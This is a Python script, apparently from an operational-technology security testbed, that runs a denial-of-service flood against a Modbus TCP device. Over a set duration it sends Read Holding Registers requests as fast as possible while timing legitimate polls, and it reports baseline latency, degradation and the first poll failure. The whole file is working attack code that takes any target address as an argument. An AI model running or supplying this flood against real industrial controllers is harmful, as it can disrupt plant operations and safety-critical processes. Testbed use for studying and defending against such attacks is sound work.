#!/usr/bin/env python3
"""
OT Security Testbed — Scenario 3: Denial of Service
=====================================================
Floods the target with FC3 Read Holding Registers as fast as possible
using the pymodbus async client, while a separate thread measures
legitimate poll response times.

Usage:
    python3 scenario3_dos.py [--target 10.0.0.2] [--port 5502] [--duration 30]
"""

import argparse
import asyncio
import sys
import threading
import time
from datetime import datetime

from pymodbus.client import AsyncModbusTcpClient, ModbusTcpClient
from pymodbus.exceptions import ModbusException


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(description="Modbus TCP DoS flood")
    parser.add_argument("--target", default="10.0.0.2", help="Target IP")
    parser.add_argument("--port", type=int, default=5502, help="Target port")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds")
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Shared state (thread-safe via list append + read)
# ---------------------------------------------------------------------------
class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.flood_sent = 0
        self.flood_errors = 0
        self.poll_results = []   # list of (timestamp, response_ms, success)
        self.start_time = None

    def record_flood(self, success):
        with self._lock:
            self.flood_sent += 1
            if not success:
                self.flood_errors += 1

    def record_poll(self, ts, ms, success):
        with self._lock:
            self.poll_results.append((ts, ms, success))

    def snapshot(self):
        with self._lock:
            return (
                self.flood_sent,
                self.flood_errors,
                list(self.poll_results),
            )


# ---------------------------------------------------------------------------
# Legitimate poll thread (runs every 2 seconds using sync client)
# ---------------------------------------------------------------------------
def legitimate_poll_thread(target, port, duration, stats, stop_event):
    client = ModbusTcpClient(target, port=port)
    client.connect()

    while not stop_event.is_set():
        t0 = time.time()
        try:
            r = client.read_holding_registers(30000, count=1, device_id=1)
            success = not r.isError()
        except Exception:
            success = False
        ms = (time.time() - t0) * 1000
        stats.record_poll(datetime.now(), ms, success)
        stop_event.wait(timeout=2.0)

    try:
        client.close()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Async flood (FC3 read loop)
# ---------------------------------------------------------------------------
async def flood_loop(target, port, duration, stats, stop_event):
    client = AsyncModbusTcpClient(target, port=port)
    await client.connect()

    deadline = time.time() + duration
    while time.time() < deadline and not stop_event.is_set():
        try:
            r = await client.read_holding_registers(30000, count=11, device_id=1)
            stats.record_flood(not r.isError())
        except Exception:
            stats.record_flood(False)

    client.close()


# ---------------------------------------------------------------------------
# Summary printer (runs every 5 seconds)
# ---------------------------------------------------------------------------
def print_summary(stats, elapsed, total_duration):
    sent, errors, polls = stats.snapshot()
    rps = sent / max(elapsed, 0.001)

    total_polls = len(polls)
    ok_polls = sum(1 for _, _, s in polls if s)
    success_rate = (ok_polls / total_polls * 100) if total_polls else 0.0

    recent_polls = [ms for _, ms, _ in polls[-5:]]
    avg_ms = sum(recent_polls) / len(recent_polls) if recent_polls else 0.0

    print(
        f"  [{elapsed:>5.1f}s / {total_duration}s]  "
        f"Flood: {sent:>7} sent  {rps:>7.0f} req/s  |  "
        f"Poll: {ok_polls}/{total_polls} ok ({success_rate:.0f}%)  "
        f"avg {avg_ms:.0f}ms"
    )
    sys.stdout.flush()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
async def async_main(args):
    print("=" * 70)
    print("  OT Security Testbed — Scenario 3: Denial of Service")
    print(f"  Target: {args.target}:{args.port}  Duration: {args.duration}s")
    print(f"  Start:  {datetime.now().strftime('%Y-%m-%dT%H:%M:%S')}")
    print("=" * 70)
    print("  Starting flood and legitimate poll monitor...\n")

    stats = Stats()
    stop_event = threading.Event()
    stats.start_time = time.time()

    # Start legitimate poll thread
    poll_thread = threading.Thread(
        target=legitimate_poll_thread,
        args=(args.target, args.port, args.duration, stats, stop_event),
        daemon=True,
    )
    poll_thread.start()

    # Get a baseline poll before flood (3 polls at 1-second intervals)
    print("[*] Measuring 3-sample baseline (pre-flood)...")
    baseline_client = ModbusTcpClient(args.target, port=args.port)
    baseline_client.connect()
    baseline_times = []
    for i in range(3):
        t0 = time.time()
        try:
            r = baseline_client.read_holding_registers(30000, count=1, device_id=1)
            ok = not r.isError()
        except Exception:
            ok = False
        ms = (time.time() - t0) * 1000
        baseline_times.append(ms)
        print(f"    Pre-flood poll {i + 1}: {ms:.1f}ms  ({'ok' if ok else 'FAIL'})")
        time.sleep(1)
    baseline_client.close()
    baseline_avg = sum(baseline_times) / len(baseline_times)
    print(f"    Baseline avg: {baseline_avg:.1f}ms\n")

    # Run flood + summary printer concurrently
    summary_task = None
    deadline = time.time() + args.duration

    async def summary_loop():
        next_tick = time.time() + 5
        while time.time() < deadline:
            now = time.time()
            if now >= next_tick:
                elapsed = now - stats.start_time
                print_summary(stats, elapsed, args.duration)
                next_tick += 5
            await asyncio.sleep(0.1)

    flood_task = asyncio.create_task(
        flood_loop(args.target, args.port, args.duration, stats, stop_event)
    )
    summary_task = asyncio.create_task(summary_loop())

    await asyncio.gather(flood_task, summary_task)

    stop_event.set()
    poll_thread.join(timeout=5)

    # --- Final report ---
    total_time = time.time() - stats.start_time
    sent, errors, polls = stats.snapshot()

    total_polls = len(polls)
    ok_polls = sum(1 for _, _, s in polls if s)
    fail_polls = total_polls - ok_polls
    success_rate_pct = (ok_polls / total_polls * 100) if total_polls else 0.0

    all_ms = [ms for _, ms, _ in polls]
    peak_rps = sent / total_time if total_time > 0 else 0
    during_avg_ms = sum(all_ms) / len(all_ms) if all_ms else 0.0

    # Find first poll that failed
    first_failure_idx = None
    for i, (_, _, s) in enumerate(polls):
        if not s:
            first_failure_idx = i
            break

    print("\n" + "=" * 70)
    print("  FINAL RESULTS")
    print("=" * 70)
    print(f"  Duration:                  {total_time:.1f}s")
    print(f"  Total flood requests sent: {sent}")
    print(f"  Flood errors:              {errors}")
    print(f"  Peak request rate:         {peak_rps:.0f} req/s")
    print()
    print(f"  Legitimate polls sent:     {total_polls}")
    print(f"  Polls succeeded:           {ok_polls}")
    print(f"  Polls failed:              {fail_polls}")
    print(f"  Poll success rate:         {success_rate_pct:.1f}%")
    print()
    print(f"  Baseline response avg:     {baseline_avg:.1f}ms")
    print(f"  During-attack avg:         {during_avg_ms:.1f}ms")
    degradation = during_avg_ms - baseline_avg
    print(f"  Response degradation:      {degradation:+.1f}ms")

    if first_failure_idx is not None:
        fail_ts = polls[first_failure_idx][0].strftime("%H:%M:%S.%f")[:-3]
        print(f"  First poll failure at:     poll #{first_failure_idx + 1}  ({fail_ts})")
    else:
        print("  First poll failure at:     No failures observed during test")

    print("=" * 70)
    print(f"  End: {datetime.now().strftime('%Y-%m-%dT%H:%M:%S')}")
    print("=" * 70)


def main():
    args = parse_args()
    asyncio.run(async_main(args))


if __name__ == "__main__":
    main()
